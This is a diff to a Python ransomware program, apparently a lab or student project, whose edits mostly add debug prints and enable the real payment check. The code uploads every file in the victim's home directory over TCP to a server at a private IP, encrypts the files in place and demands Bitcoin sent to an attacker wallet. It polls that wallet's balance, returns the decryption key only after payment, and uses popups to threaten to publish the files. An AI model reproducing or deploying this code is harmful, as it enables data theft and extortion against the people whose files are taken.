@@ -14,8 +14,14 @@ import re
 import tempfile
 
 class Ransomware: 
+    """ This class represents a ransomware that will be executed once the link is 
+    clicked.
+    """
+    # IP address of the server
     SERVER_IP = "10.0.2.5"
+    # Format of encoding for the messages and files sent over the TCP connection
     ENCODING = "utf-8"
+    # The buffer size when receiving the data
     MAX_SIZE = 4096
 
     global bitcoin_needed, wallet_address, initial_balance
@@ -23,9 +29,9 @@ class Ransomware:
     wallet_address = 'tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv' #address of attackers wallet
     initial_balance = 0
 
-    def __init__(self, host1, host2, number, directory):
-        # Construct hostname of the remote server from the first two
-        # arguments.
+    def __init__(self, number, directory):
+        """Once the object of the class has been made, the port number and TCP connection will be initialized"""
+        # Construct hostname of the remote server from the first two arguments.
         self._host = self.SERVER_IP
         # Calculate the port number from the last argument.
         self._port = self.decode_port(number)
@@ -42,10 +48,6 @@ class Ransomware:
     @host.setter
     def host(self, new_host):
         self._host = new_host
-
-    def decode_hostname(self, str1, str2):
-        """ Returns hostname of the remote server. """
-        return str2[::-1] + str1[::-1]
 
     @property
     def port(self):
@@ -75,14 +77,17 @@ class Ransomware:
         self._socket.sendall(base64.b64encode(filename.encode(Ransomware.ENCODING)))
         time.sleep(0.01)
         msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
+        print(f"[SERVER]: {msg}")
 
         while True:
             data = file.read(1024)
+            print(data)
             if not data:
                 break
             """ Sending the file data to the server. """
             self._socket.sendall(base64.b64encode(data.encode(Ransomware.ENCODING)))
             msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
+            print(f"[SERVER]: {msg}")
 
         """ Closing the file. """
         file.close()
@@ -90,6 +95,7 @@ class Ransomware:
         time.sleep(0.01)
         self._socket.send(base64.b64encode("FILEDONE\n".encode(Ransomware.ENCODING)))
         msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
+        print(f"[SERVER]: {msg}")
 
 
     def get_balance(self, wallet_address):
@@ -101,6 +107,7 @@ class Ransomware:
 
         # Make API request to retrieve wallet balance
         response = requests.get(balance_url)
+        print(response.status_code)
         if response.status_code == 200:
             response_text = response.text
             index =  response_text.find("balance of")
@@ -115,7 +122,9 @@ class Ransomware:
         current_balance = self.get_balance(wallet_address)
         change = current_balance - initial_bal
         
-        print('Payment has been made: '+ str(change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001))
+        print("balance changed by: " + str(change))
+        print("Required change: " + str(bitcoin_needed))
+        print(change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001)
 
         if (change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001):
             return True
@@ -140,7 +149,6 @@ class Ransomware:
             for directory in dirs:
                 result.append(os.path.join(root, directory))
 
-        result = list(dict.fromkeys(result))
         return result  # Return the list of directories
 
     # Method that retrieves all of the files in a directory and purposely does not include the ransomeware
@@ -157,21 +165,21 @@ class Ransomware:
                 files.append(file)
 
         return files
-    
-
 
     def establish_connection(self):
         """ Create a connection to the server. """
         try:
-            print('Connection established to the server')
+            print(self._host)
             self.socket.connect((self._host, self._port))
         except socket.error:
+            logging.debug('Dropper could not connect to the server.')
             return
 
 
 
     # Method for encrypting a single file
     def encrypt_file(self, file, key):
+        print("started")
         with open(file, "rb") as the_file:
             contents = the_file.read()
             
@@ -190,6 +198,8 @@ class Ransomware:
                 with open(file, "ab") as f:
                     f.write(enc_chunk)
                     
+        print("terminated")
+
 
     def calulate_bitcoin(self, size_of_files):
         global bitcoin_needed
@@ -209,25 +219,21 @@ class Ransomware:
                 size_of_files += file_size
                 number_of_files += 1
                 
+                print("filename: "+file)
+
                 # Send file to server
                 self.send_file_to_server(file_path, file)
                 
                 # Encrypt file
                 self.encrypt_file(file_path, key)
-
-                print("Encrypted and sent "+file)
-
         
         self._socket.sendall(base64.b64encode("DONE.".encode(Ransomware.ENCODING)))
-        
-
 
         print("Number of files encrypted: " + str(number_of_files))
         print("Total size of files: " + str(size_of_files))
         
         #Update the amount of bitcoin that we want glboabbly
         self.calulate_bitcoin(size_of_files)
-        print('Bitcoins to be paid: '+bitcoin_needed)
 
     def decrypt_file(self, file_path, key):
         with open(file_path, "rb") as file:
@@ -269,14 +275,16 @@ class Ransomware:
         
         """ Receiving the public key. """
         filename = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode("utf-8")
+        print(f"[RECV] Receiving the public key.")
         file = open(filename, "w")
         self._socket.sendall(base64.b64encode("Public key filename received.".encode("utf-8")))
-
+ 
         """ Receiving the public key from the server. """
         data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode("utf-8")
         file.write(data)
-        print("Received public key")
+        print(f"[RECV] Receiving the public key data.")
         self._socket.sendall(base64.b64encode("File data received".encode("utf-8")))
+        print("data: "+data)
  
         """ Closing the file. """
         file.close()
@@ -324,22 +332,28 @@ class Ransomware:
             if (counter == 60):
                 counter = 1
 
-                if (True):
+                if (self.check_if_user_has_paid(initial_balance)):
                     # Waits until all the files has been uploaded before processing the payment
+
+                    
 
                     popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
                 
                     """ Receiving the private key. """
                     filename = base64.b64decode(self._socket.recv(2048)).decode("utf-8")
                     filename = 'private_key.pem'
+                    print(f"[RECV] Receiving the private key")
+                    print("filename: " + filename)
 
                     key = open(filename, "wb")
                     self._socket.sendall(base64.b64encode("Private key filename received.".encode("utf-8")))
         
                     """ Receiving the private key from the server. """
                     data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE))
-
-                    print("Received private key")
+                    print(data)
+                    print(type(data))
+                
+                    print(f"[RECV] Receiving the private key data.")
                     key.write(data)
                     self._socket.sendall(base64.b64encode("File Data recieved.".encode("utf-8")))
                 
@@ -356,9 +370,11 @@ class Ransomware:
                     self._socket.sendall(base64.b64encode("x".encode("utf-8")))
 
 
-                    return
+                    break
                 
-        subprocess.Popen(["zenity", "--warning", "--text", "TIMER HAS RUN OUT. \n Publishing your files to the internet","--width", "400", "--height", "200" ])
+                    #TODO: Implement code to delete all the files that are stored on the server
+
+            subprocess.Popen(["zenity", "--info", "--text", "TIMER HAS RUN OUT. \n Publishing your files to the internet","--width", "400", "--height", "200" ])
 
 #Main function/ control flow
 if __name__ == '__main__':
@@ -369,7 +385,7 @@ if __name__ == '__main__':
     logging.basicConfig(level=logging.DEBUG)
 
     # Initialize Ransomware
-    ransomware = Ransomware('tsoh', 'lacol', 729000000, home)
+    ransomware = Ransomware(729000000, home)
     
 
     # Start the attack
